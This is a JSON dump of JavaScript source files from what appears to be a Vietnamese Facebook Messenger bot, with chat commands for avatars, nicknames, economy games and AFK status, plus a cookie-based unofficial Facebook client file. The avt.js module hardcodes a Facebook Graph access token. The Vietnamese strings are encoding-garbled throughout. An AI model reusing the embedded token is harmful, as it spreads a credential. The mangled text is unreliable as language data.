api.sendMessage(\"S·ª≠ d·ª•ng l·ªánh: atstk on/off ƒë·ªÉ b·∫≠t ho·∫∑c t·∫Øt t√≠nh nƒÉng.\", threadID);\n    }\n};\n","path":null,"size_bytes":3875,"size_tokens":null},"modules/commands/avt.js":{"content":"const fs = require('fs');\nconst axios = require('axios');\n\nmodule.exports.config = {\n    name: \"avt\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"Jukie\",\n    description: \"L·∫•y ·∫£nh ƒë·∫°i di·ªán\",\n    commandCategory: \"C√¥ng c·ª•\",\n    usages: \"[user|box|tid]\",\n    cooldowns: 3\n};\n\nmodule.exports.run = async ({ api, event, args, Users }) => {\n    const { threadID, messageID, senderID, type, messageReply, mentions } = event;\n\n    const sendImage = async (url, message) => {\n        try {\n            const response = await axios.get(url, { responseType: 'arraybuffer' });\n            if (response.status !== 200) {\n                return api.sendMessage(\"‚ö†Ô∏è Kh√¥ng th·ªÉ t·∫£i ·∫£nh ƒë·∫°i di·ªán. Vui l√≤ng th·ª≠ l·∫°i sau.\", threadID, messageID);\n            }\n            const imagePath = __dirname + '/cache/avt.png';\n            fs.writeFileSync(imagePath, response.data);\n            api.sendMessage({ body: message, attachment: fs.createReadStream(imagePath) }, threadID, () => {\n                fs.unlinkSync(imagePath);\n            }, messageID);\n        } catch (error) {\n            console.error(error);\n            api.sendMessage(\"‚ö†Ô∏è ƒê√£ c√≥ l·ªói x·∫£y ra, vui l√≤ng th·ª≠ l·∫°i sau.\", threadID, messageID);\n        }\n    };\n\n    if (args.length === 0) {\n        return api.sendMessage(`‚ö°Ô∏èB·∫°n c√≥ th·ªÉ d√πng:\\n\\n${this.config.name} user => n√≥ s·∫Ω l·∫•y ·∫£nh ƒë·∫°i di·ªán c·ªßa ch√≠nh b·∫°n.\\n\\n${this.config.name} user @[Tag] => n√≥ s·∫Ω l·∫•y ·∫£nh ƒë·∫°i di·ªán c·ªßa ng∆∞·ªùi b·∫°n tag.\\n\\n${this.config.name} box => n√≥ s·∫Ω l·∫•y ·∫£nh ƒë·∫°i di·ªán c·ªßa box c·ªßa b·∫°n\\n\\n${this.config.name} user box tid => n√≥ s·∫Ω l·∫•y ·∫£nh ƒë·∫°i di·ªán c·ªßa tid`, threadID, messageID);\n    }\n\n    if (args[0] === \"box\") {\n        let targetThreadID = threadID;\n        if (args[1]) targetThreadID = args[1];\n\n        try {\n            const threadInfo = await api.getThreadInfo(targetThreadID);\n            if (!threadInfo.imageSrc) {\n                return api.sendMessage(`‚ö°Ô∏èBox n√†y kh√¥ng c√≥ ·∫£nh ƒë·∫°i di·ªán`, threadID, messageID);\n            }\n            return sendImage(threadInfo.imageSrc, `‚ö°Ô∏è·∫¢nh ƒë·∫°i di·ªán c·ªßa box ${threadInfo.threadName} ƒë√¢y`);\n        } catch (error) {\n            console.error(error);\n            return api.sendMessage(\"‚ö†Ô∏è Kh√¥ng th·ªÉ l·∫•y th√¥ng tin c·ªßa box. Vui l√≤ng th·ª≠ l·∫°i sau.\", threadID, messageID);\n        }\n    }\n\n    if (args[0] === \"user\") {\n        let targetID = senderID;\n\n        if (args[1]) {\n            if (Object.keys(mentions).length > 0) {\n                targetID = Object.keys(mentions)[0];\n            } else if (args[1] === \"tid\") {\n                if (args[2]) {\n                    targetID = args[2];\n                } else {\n                    return api.sendMessage(`‚ö°Ô∏èB·∫°n ch∆∞a nh·∫≠p ID c·ªßa ng∆∞·ªùi d√πng`, threadID, messageID);\n                }\n            }\n        } else if (type === \"message_reply\") {\n            targetID = messageReply.senderID;\n        }\n\n        try {\n            const userInfo = await Users.getData(targetID);\n            const userName = userInfo.name || \"ng∆∞·ªùi d√πng\";\n            const imageUrl = `https://graph.facebook.com/${targetID}/picture?height=720&width=720&access_token=6628568379|c1e620fa708a1d5696fb991c1bde5662`;\n            return sendImage(imageUrl, `‚ö°Ô∏è·∫¢nh ƒë·∫°i di·ªán c·ªßa ${userName} ƒë√¢y`);\n        } catch (error) {\n            console.error(error);\n            return api.sendMessage(`‚ö†Ô∏è Kh√¥ng th·ªÉ l·∫•y th√¥ng tin ng∆∞·ªùi d√πng. Vui l√≤ng th·ª≠ l·∫°i sau.`, threadID, messageID);\n        }\n    }\n};\n","path":null,"size_bytes":3638,"size_tokens":null},"modules/commands/autosetname.js":{"content":"const { existsSync, writeFileSync, mkdirSync } = global.nodemodule[\"fs-extra\"];\nconst { join } = global.nodemodule[\"path\"];\nconst moment = require(\"moment-timezone\");\n\nmodule.exports.config = {\n    name: \"autosetname\",\n    version: \"1.0.1\",\n    hasPermssion: 1,\n    credits: \"Vtuan (Modified by AI)\",\n    description: \"T·ª± ƒë·ªông setname cho th√†nh vi√™n m·ªõi\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"[add <name> /remove]\",\n    cooldowns: 0\n};\n\nmodule.exports.onLoad = () => {\n    const pathCache = join(__dirname, \"data\");\n    const pathData = join(pathCache, \"autosetname.json\");\n\n    if (!existsSync(pathCache)) mkdirSync(pathCache, { recursive: true });\n    if (!existsSync(pathData)) writeFileSync(pathData, \"[]\", \"utf-8\");\n};\n\nmodule.exports.run = async function ({ event, api, args }) {\n    const { threadID, messageID } = event;\n    const { readFileSync, writeFileSync } = global.nodemodule[\"fs-extra\"];\n    const pathData = join(__dirname, \"data\",\"autosetname.json\");\n\n    let dataJson;\n    try {\n        dataJson = JSON.parse(readFileSync(pathData, \"utf-8\"));\n    } catch (error) {\n        dataJson = [];\n        writeFileSync(pathData, JSON.stringify([]), \"utf-8\");\n    }\n\n    const thisThread = dataJson.find(item => item.threadID == threadID) || { threadID, nameUser: [] };\n\n    const content = args.slice(1).join(\" \");\n    switch (args[0]) {\n        case \"add\":\n            if (!content) return api.sendMessage(\"‚Üí B·∫°n ch∆∞a nh·∫≠p c·∫•u h√¨nh t√™n!\", threadID, messageID);\n            if (thisThread.nameUser.length > 0) return api.sendMessage(\"‚Üí C·∫•u h√¨nh c≈© t·ªìn t·∫°i! Vui l√≤ng x√≥a c·∫•u h√¨nh tr∆∞·ªõc.\", threadID, messageID);\n\n            thisThread.nameUser.push(content);\n            if (!dataJson.some(item => item.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(`‚Üí ƒê·∫∑t c·∫•u h√¨nh t√™n th√†nh vi√™n m·ªõi th√†nh c√¥ng: ${content}`, threadID, messageID);\n\n        case \"remove\":\n            if (thisThread.nameUser.length === 0) return api.sendMessage(\"‚Üí Kh√¥ng c√≥ c·∫•u h√¨nh ƒë·ªÉ x√≥a!\", threadID, messageID);\n\n            thisThread.nameUser = [];\n            const index = dataJson.findIndex(item => item.threadID == threadID);\n            if (index !== -1) dataJson.splice(index, 1);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí X√≥a c·∫•u h√¨nh th√†nh c√¥ng!\", threadID, messageID);\n\n        default:\n            return api.sendMessage(\n                `h∆∞·ªõng d·∫´n s·ª≠ d·ª•ng:\n#autosetname add bi·ªát danh: bi·ªát danh t·∫°m th·ªùi cho th√†nh vi√™n m·ªõi\n#autosetname remove: b·ªè t·ª± ƒë·∫∑t bi·ªát danh cho th√†nh vi√™n m·ªõi\n`,\n                threadID,\n                messageID\n            );\n    }\n};\n","path":null,"size_bytes":2871,"size_tokens":null},"modules/commands/loikhuyen.js":{"content":"module.exports.config = {\n\tname: \"loikhuyen\",\n\tversion: \"1.0.2\",\n\thasPermssion: 0,\n\tcredits: \"JRT\",\n\tdescription: \"ƒê∆∞a ra ng·∫´u nhi√™n cho b·∫°n 1 l·ªùi khuy√™n\",\n\tcommandCategory: \"Ti·ªán √≠ch\",\n\tusages: \"loikhuyen\",\n\tcooldowns: 5,\n\tdependencies: {\"srod-v2\": \"\",\"request\": \"\"}\n};\n\nmodule.exports.run = async ({ event, api, args }) => {\n  \n  const request = global.nodemodule[\"request\"];\n  const srod = global.nodemodule[\"srod-v2\"];\n  const Data = (await srod.GetAdvice()).embed.description;\n  \n  return request(encodeURI(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=vi&dt=t&q=${Data}`), (err, response, body) => {\n\t\tif (err) return api.sendMessage(\"ƒê√£ c√≥ l·ªói x·∫£y ra!\", event.threadID, event.messageID);\n\t\tvar retrieve = JSON.parse(body);\n\t\tvar text = '';\n\t\tretrieve[0].forEach(item => (item[0]) ? text += item[0] : '');\n    api.sendMessage(Data+'\\n'+text, event.threadID, event.messageID)\n  });\n}\n","path":null,"size_bytes":938,"size_tokens":null},"modules/commands/work.js":{"content":"// danh s√°ch c√¥ng vi·ªác\nlet works = [\n    { name: 'c√¢u c√°', done: [\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° ƒë√®n l·ªìng v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° m·∫≠p v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c t√¥m t√≠t v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° ng·ª´ v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° thu v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° koi v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° tr√™ v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫°n v·ª´a b·∫Øt ƒë∆∞·ª£c c√° ch√©p v√† b√°n ƒë∆∞·ª£c {money}$'\n    ]},\n    { name: 'sƒÉn th√∫ hoang', done: [\n        '{name} b·∫Øn ƒë∆∞·ª£c con r·∫Øn v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫Øn ƒë∆∞·ª£c con r·ªìng komodo v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫Øn ƒë∆∞·ª£c con b√≥i c√° v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫Øn ƒë∆∞·ª£c con g·∫•u n√¢u v√† b√°n ƒë∆∞·ª£c {money}$'\n    ]},\n    { name: 'ƒê√†o ƒë√°', done: [\n        '{name} ƒë√£ ƒë√†o ƒë∆∞·ª£c vi√™n kim c∆∞∆°ng v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} ƒë√£ ƒë√†o ƒë∆∞·ª£c v√†ng v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} ƒë√£ ƒë√†o ƒë∆∞·ª£c qu·∫∑ng s·∫Øt v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} ƒë√£ ƒë√†o ƒë∆∞·ª£c ng·ªçc l·ª•c b·∫£o v√† b√°n ƒë∆∞·ª£c {money}$'\n    ]},\n    { name: 'b·∫Øn chim', done: [\n        '{name} b·∫Øn ƒë∆∞·ª£c con chim ƒëen v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫Øn ƒë∆∞·ª£c con ƒë·∫°i b√†ng v√† b√°n ƒë∆∞·ª£c {money}$',\n        '{name} b·∫Øn ƒë∆∞·ª£c con chim √©n v√† b√°n ƒë∆∞·ª£c {money}$'\n    ]}\n];\n\n// c·∫•u h√¨nh module\nexports.config = {\n    name: 'works',\n    version: '0.0.3',\n    hasPermssion: 0,\n    credits: 'DC-Nam',\n    description: 'work',\n    commandCategory: 'Ti·ªán √≠ch',\n    usages: '[]',\n    cooldowns: 3\n};\n\nlet _0 = x => x < 10 ? '0' + x : x;\nlet random = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;\n\nexports.run = async o => {\n    let body = `[ C√¥ng vi·ªác ]\\n${works.map((w, i) => `[${i + 1}] ${w.name}`).join('\\n')}\\n\\n-> Reply s·ªë t∆∞∆°ng ·ª©ng ƒë·ªÉ ch·ªçn c√¥ng vi·ªác.`;\n    o.api.sendMessage({ body }, o.event.threadID, (err, res) => {\n        res.name = exports.config.name;\n        res.event = o.event;\n        global.client.handleReply.push(res); // ch·ªâ push handleReply\n    }, o.event.messageID);\n};\n\nexports.handleReply = async o => {\n    let _ = o.handleReply;\n    let uid = o.event.senderID;\n    let user = await o.Users.getData(uid);\n    if (!user) return o.api.sendMessage(`Error`, o.event.threadID);\n\n    let data = user.data || {};\n    let send = (msg) => o.api.sendMessage(msg, o.event.threadID);\n\n    if (uid != _.event.senderID) return;\n\n    // ki·ªÉm tra cooldown\n    if (data.work && data.work >= Date.now()) {\n        let x = data.work - Date.now();\n        return send(`H√£y l√†m vi·ªác sau: ${_0(Math.floor(x / 60000))} ph√∫t ${_0(Math.floor(x / 1000 % 60))} gi√¢y.`);\n    }\n\n    let index = parseInt(o.event.body) - 1;\n    if (isNaN(index) || index < 0 || index >= works.length)\n        return send(`C√¥ng vi·ªác kh√¥ng h·ª£p l·ªá, vui l√≤ng reply s·ªë t·ª´ 1 ƒë·∫øn ${works.length}.`);\n\n    let work = works[index];\n    data.work = Date.now() + (1000 * 60 * 60); // cooldown 1 gi·ªù\n    o.Users.setData(uid, user);\n\n    send(`ƒêang ${work.name}...`);\n    await new Promise(res => setTimeout(res, 3500));\n\n    let done = work.done[random(0, work.done.length - 1)];\n    let money = random(5000, 20000);\n    send(done.replace(/{name}/g, user.name).replace(/{money}/g, money));\n\n    o.Currencies.increaseMoney(uid, money);\n};\n","path":null,"size_bytes":3701,"size_tokens":null},"modules/commands/cuop.js":{"content":"const cc = 33 // T·ªâ l·ªá th√†nh c√¥ng :>\nmodule.exports.config = {\n\tname: \"cuop\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"Khoa\",\n\tdescription: \"Ph·ªß ƒë·ªãnh h·ªçc thuy·∫øt lao ƒë·ªông c·ªßa tri·∫øt gia Hu·∫•n r√¥ s√¨ :>\",\n\tcommandCategory: \"Tr√≤ Ch∆°i\",\n\tusages: \"@tag\",\n\tcooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, Users, Threads, Currencies }) {\n  var { threadID, messageID, senderID } = event;\n  const data1 = await Currencies.getData(senderID);\n  const money1 = data1.money;\n  if (money1 < 1 || isNaN(money1)) return api.sendMessage(`B·∫°n kh√¥ng c√≥ ti·ªÅn l·ª° b·ªã b·∫Øt r l·∫•y g√¨ tr·∫£!`, threadID, messageID);\n  var mention = Object.keys(event.mentions)[0];\n  if (!mention) return api.sendMessage(`Vui l√≤ng tag m·ª•c ti√™u!`, threadID, messageID);\n  const botID = api.getCurrentUserID();\n  if (mention == botID) return api.sendMessage(\"ƒê·ªãnh tr·ªôm c·∫£ tao √† -.-\", threadID, messageID);\n  var name = await Users.getNameUser(mention);\n  const data2 = await Currencies.getData(mention);\n  const money2 = data2.money;\n  if (money2 < 1 || isNaN(money2)) return api.sendMessage(`M·ª•c ti√™u ${name} kh√¥ng c√≥ ƒë·ªìng xu d√≠nh t√∫i!`, threadID, messageID);\n  var tile = Math.floor(Math.random() * 100) + 1;\n  if (tile < cc) {\n    if (money2 < 10000) {var phan = 4} else {var phan = 8};\n    var sotien = Math.floor(Math.random() * money2/phan) + 1;\n    Currencies.increaseMoney(senderID, sotien);\n    Currencies.decreaseMoney(mention, sotien);\n    return api.sendMessage(`B·∫°n ƒë√£ c∆∞·ªõp th√†nh c√¥ng ${sotien}$ c·ªßa ${name} :>`, threadID, messageID);\n  }\n  else {\n    if (money1 < 10000) {var phan = 4} else {var phan = 8};\n    var sotienmat = Math.floor(Math.random() * money1/phan) + 1;\n    Currencies.decreaseMoney(senderID, sotienmat);\n    Currencies.increaseMoney(mention, sotienmat);\n    return api.sendMessage(`B·∫°n ƒë√£ c∆∞·ªõp ${name} th·∫•t b·∫°i v√† m·∫•t ${sotienmat}$ :>`, threadID, messageID);\n  }\n}","path":null,"size_bytes":1963,"size_tokens":null},"lib/fca-auto/src/markAsDelivered.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function markAsDelivered(threadID, messageID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    if (!threadID || !messageID) return callback(\"Error: messageID or threadID is not defined\");\n\n    var form = {};\n\n    form[\"message_ids[0]\"] = messageID;\n    form[\"thread_ids[\" + threadID + \"][0]\"] = messageID;\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/delivery_receipts.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"markAsDelivered\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1332,"size_tokens":null},"modules/events/checktt.js":{"content":"module.exports.config = {\n    name: \"checktt_remove\",\n    eventType: [\"log:unsubscribe\", \"log:thread-removed\"],\n    version: \"1.0.0\",\n    credits: \"ChatGPT\",\n    description: \"X√≥a d·ªØ li·ªáu checktt khi bot r·ªùi nh√≥m ho·∫∑c ng∆∞·ªùi r·ªùi nh√≥m\"\n};\n\nconst fs = require(\"fs-extra\");\nconst path = require(\"path\");\nconst dataPath = path.join(__dirname, \"../commands/tuongtac/checktt/\"); // theo c·∫•u tr√∫c checktt\n\nmodule.exports.run = async function({ event, api }) {\n    const { threadID, logMessageData } = event;\n\n    // N·∫øu bot r·ªùi nh√≥m\n    if (logMessageData.leftParticipantFbId === api.getCurrentUserID() || logMessageData.leftParticipantFbIds?.includes(api.getCurrentUserID())) {\n        const file = path.join(dataPath, threadID + \".json\");\n        if (fs.existsSync(file)) {\n            fs.removeSync(file);\n            console.log(`[checktt_remove] ƒê√£ x√≥a d·ªØ li·ªáu nh√≥m ${threadID} v√¨ bot r·ªùi nh√≥m.`);\n        }\n        return;\n    }\n\n    // Ng∆∞·ªùi r·ªùi nh√≥m\n    let usersLeft = [];\n    if (logMessageData.leftParticipantFbId) usersLeft.push(logMessageData.leftParticipantFbId);\n    if (logMessageData.leftParticipantFbIds && Array.isArray(logMessageData.leftParticipantFbIds)) usersLeft = usersLeft.concat(logMessageData.leftParticipantFbIds);\n\n    if (usersLeft.length === 0) return;\n\n    const file = path.join(dataPath, threadID + \".json\");\n    if (!fs.existsSync(file)) return;\n\n    let threadData = JSON.parse(fs.readFileSync(file, \"utf-8\"));\n\n    [\"total\", \"week\", \"day\"].forEach(key => {\n        if (Array.isArray(threadData[key])) {\n            threadData[key] = threadData[key].filter(u => !usersLeft.includes(u.id));\n        }\n    });\n\n    fs.writeFileSync(file, JSON.stringify(threadData, null, 4));\n    console.log(`[checktt_remove] ƒê√£ x√≥a d·ªØ li·ªáu c·ªßa ${usersLeft.length} ng∆∞·ªùi r·ªùi nh√≥m trong thread ${threadID}.`);\n};\n","path":null,"size_bytes":1880,"size_tokens":null},"modules/commands/ausand.js":{"content":"module.exports.config = {\n  name: \"ausand\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n\n  const girl = require('./../../img/ausand.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Ausand ƒë√¢yyyyy:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1612,"size_tokens":null},"modules/commands/leavenoti.js":{"content":"const { existsSync, writeFileSync, mkdirSync, readFileSync } = require(\"fs-extra\");\nconst { join } = require(\"path\");\n\nmodule.exports.config = {\n    name: \"leavenoti\",\n    version: \"1.0.0\",\n    hasPermssion: 1,\n    credits: \"TatsuYTB\",\n    description: \"Qu·∫£n l√Ω tin nh·∫Øn r·ªùi nh√≥m t√πy bi·∫øn cho t·ª´ng nh√≥m\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"[add <message> /remove /on /off]\",\n    cooldowns: 0\n};\n\nconst pathCache = join(__dirname, \"data\");\nconst pathData = join(pathCache, \"leaveNoti.json\");\n\nmodule.exports.onLoad = () => {\n    if (!existsSync(pathCache)) mkdirSync(pathCache, { recursive: true });\n    if (!existsSync(pathData)) writeFileSync(pathData, \"[]\", \"utf-8\");\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    const { threadID, messageID } = event;\n\n    let dataJson;\n    try { dataJson = JSON.parse(readFileSync(pathData, \"utf-8\")); } \n    catch { dataJson = []; writeFileSync(pathData, JSON.stringify([]), \"utf-8\"); }\n\n    let thisThread = dataJson.find(i => i.threadID == threadID) || { threadID, message: null, enable: true };\n\n    const content = args.slice(1).join(\" \");\n\n    switch (args[0]) {\n        case \"add\":\n            if (!content) return api.sendMessage(\"‚Üí B·∫°n ch∆∞a nh·∫≠p tin nh·∫Øn r·ªùi!\", threadID, messageID);\n            thisThread.message = content;\n            if (!dataJson.some(i => i.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(`‚Üí C·∫•u h√¨nh tin nh·∫Øn r·ªùi th√†nh c√¥ng!\\n‚Üí H·ªó tr·ª£ c√°c bi·∫øn:\\n{name}: T√™n th√†nh vi√™n r·ªùi\\n{iduser}: ID th√†nh vi√™n r·ªùi\\n{type}: Lo·∫°i r·ªùi (r·ªùi/kick)\\n{session}: Bu·ªïi trong ng√†y\\n{fullYear}: NƒÉm hi·ªán t·∫°i\\n{time}: Th·ªùi gian hi·ªán t·∫°i`, threadID, messageID);\n\n        case \"remove\":\n            thisThread.message = null;\n            const index = dataJson.findIndex(i => i.threadID == threadID);\n            if (index !== -1) dataJson.splice(index, 1);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí X√≥a c·∫•u h√¨nh tin nh·∫Øn r·ªùi th√†nh c√¥ng!\", threadID, messageID);\n\n        case \"on\":\n            thisThread.enable = true;\n            if (!dataJson.some(i => i.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí ƒê√£ b·∫≠t leaveNoti cho nh√≥m n√†y!\", threadID, messageID);\n\n        case \"off\":\n            thisThread.enable = false;\n            if (!dataJson.some(i => i.threadID == threadID)) dataJson.push(thisThread);\n            writeFileSync(pathData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n            return api.sendMessage(\"‚Üí ƒê√£ t·∫Øt leaveNoti cho nh√≥m n√†y!\", threadID, messageID);\n\n        default:\n            return api.sendMessage(\n`H∆∞·ªõng d·∫´n s·ª≠ d·ª•ng chi ti·∫øt:\n#leaveNoti add <message>: Th√™m tin nh·∫Øn r·ªùi t√πy ch·ªânh\n   ‚Üí C√≥ th·ªÉ s·ª≠ d·ª•ng c√°c bi·∫øn:\n      {name}      : T√™n th√†nh vi√™n r·ªùi\n      {iduser}    : ID th√†nh vi√™n r·ªùi\n      {type}      : Lo·∫°i r·ªùi (r·ªùi/kick)\n      {session}   : Bu·ªïi trong ng√†y (S√°ng/Tr∆∞a/Chi·ªÅu/T·ªëi)\n      {fullYear}  : NƒÉm hi·ªán t·∫°i\n      {time}      : Th·ªùi gian hi·ªán t·∫°i (DD/MM/YYYY || HH:mm:ss)\n      V√≠ d·ª•: {name} ƒë√£ r·ªùi kh·ªèi nh√≥m v√†o l√∫c {time}\n#leaveNoti remove: X√≥a tin nh·∫Øn r·ªùi\n#leaveNoti on: B·∫≠t leaveNoti cho nh√≥m\n#leaveNoti off: T·∫Øt leaveNoti cho nh√≥m`, threadID, messageID\n            );\n    }\n};\n","path":null,"size_bytes":3624,"size_tokens":null},"modules/commands/nguyentohoahoc.js":{"content":"module.exports.config = {\n\tname: \"nguyentohoahoc\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"LeMinh\",\n\tdescription: \"Nguy√™n t·ªë ho√° h·ªçc\",\n\tcommandCategory: \"Ki·∫øn Th·ª©c\",\n\tcooldowns: 0\n};\n\nmodule.exports.run = ({ event, api }) => api.sendMessage(`BaÃâng Nguy√™n T√¥ÃÅ\nS√¥ÃÅ/T√™n/KiÃÅ hi√™Ã£u/Nguy√™n t∆∞Ãâ kh√¥ÃÅi/HoÃÅa triÃ£\n1 / Hiƒëro / H / 1 / I\n2 / Heli / He / 4/ kh√¥ng coÃÅ\n3 / Liti / Li / 7 / I\n4 / Beri / Be / 9 / II\n5 / Bo/ B / 11 / III\n6 / Cacbon / C / 12 / IV,II\n7 / Nit∆° / N / 14 / III,II,IV...\n8 / Oxi / O / 16 / II\n9 / Flo / F / 19 / I\n10 / Neon / Ne / 20 / Kh√¥ng coÃÅ\n11 / Natri / Na / 23 / I\n12 / Magie / Mg / 24 / II\n13 / Nh√¥m / Al / 27/ III\n14 / Silic / Si / 28 / IV\n15 / Photpho / P / 31 / III,V\n16 / L∆∞u HuyÃÄnh / S / 32 / II,IV,V\n17 / Clo / Cl / 35,5 / I,...\n18 / Agon / Ar / 39,9 / Kh√¥ng coÃÅ\n19 / Kali / K / 39 / I\n20 / Canxin / Ca / 40 / II\n\n24/ Crom / Cr / 52 / II,III...\n25 / Mangan / Mn / 55 / II,IV,VII..\n26 / SƒÉÃÅt / Fe / 56 / II,III\n29 / ƒê√¥ÃÄng / Cu / 64 / I,II\n30 / KeÃÉm / Zn / 65 / II\n35 / Brom / Br / 80 / I...\n47 / BaÃ£c / Ag / 108 / I\n56 / Bari / Ba / 137 / II\n80 / ThuÃây Ng√¢n / Hg / 201 / I,II\n82 / ChiÃÄ / Pb / 207 / II,IV`, event.threadID, event.messageID);\n","path":null,"size_bytes":1220,"size_tokens":null},"modules/commands/afk.js":{"content":"module.exports.config = {\n\tname: \"afk\",\n\tversion: \"1.0.0\",\n\tpermissions: 1,\n\tcredits: \"Henry\",\n\tdescription: \"B·∫≠t ho·∫∑c t·∫Øt ch·∫ø ƒë·ªô afk\",\n  usages: \"[l√≠ do]\",\n  commandCategory: \"Nh√≥m\",\n  cooldowns: 5\n};\n\nconst busyPath = __dirname + '/cache/data/busy.json';\nconst fs = require('fs');\n\nmodule.exports.onLoad = () => {\n  if (!fs.existsSync(busyPath)) fs.writeFileSync(busyPath, JSON.stringify({}));\n}\n\nmodule.exports.handleEvent = async function({ api, event, Users }) {\n    let busyData = JSON.parse(fs.readFileSync(busyPath));\n    var { senderID, threadID, messageID, mentions } = event;\n    if (senderID in busyData) {\n        var info = busyData[senderID];\n        delete busyData[senderID];\n        fs.writeFileSync(busyPath, JSON.stringify(busyData, null, 4));\n        return api.sendMessage(`Ch√†o m·ª´ng b·∫°n ƒë√£ quay tr·ªü l·∫°i! ü•∞`, threadID, () => {\n            if (info.tag.length == 0) api.sendMessage(\"Trong l√∫c b·∫°n ƒëi v·∫Øng, kh√¥ng c√≥ ai nh·∫Øc ƒë·∫øn b·∫°n c·∫£\", threadID);\n            else {\n                var msg = \"\";\n                for (var i of info.tag) {\n                    msg += `${i}\\n`\n                }\n                api.sendMessage(\"ƒê√¢y l√† danh s√°ch nh·ªØng tin nh·∫Øn b·∫°n ƒë∆∞·ª£c tag trong khi b·∫°n ƒëi v·∫Øng:\\n\\n\" + msg, threadID)\n            }\n        }, messageID);\n    }\n\n    if (!mentions || Object.keys(mentions).length == 0) return;\n    \n    for (const [ID, name] of Object.entries(mentions)) {\n        if (ID in busyData) {\n            var infoBusy = busyData[ID], mentioner = await Users.getNameUser(senderID), replaceName = event.body.replace(`${name}`, \"\");\n            infoBusy.tag.push(`${mentioner}: ${replaceName == \"\" ? \"ƒê√£ tag b·∫°n\" : replaceName}`)\n            busyData[ID] = infoBusy;\n            fs.writeFileSync(busyPath, JSON.stringify(busyData, null, 4));\n            return api.sendMessage(`${name.replace(\"@\", \"\")} hi·ªán ƒëang b·∫≠n${infoBusy.lido 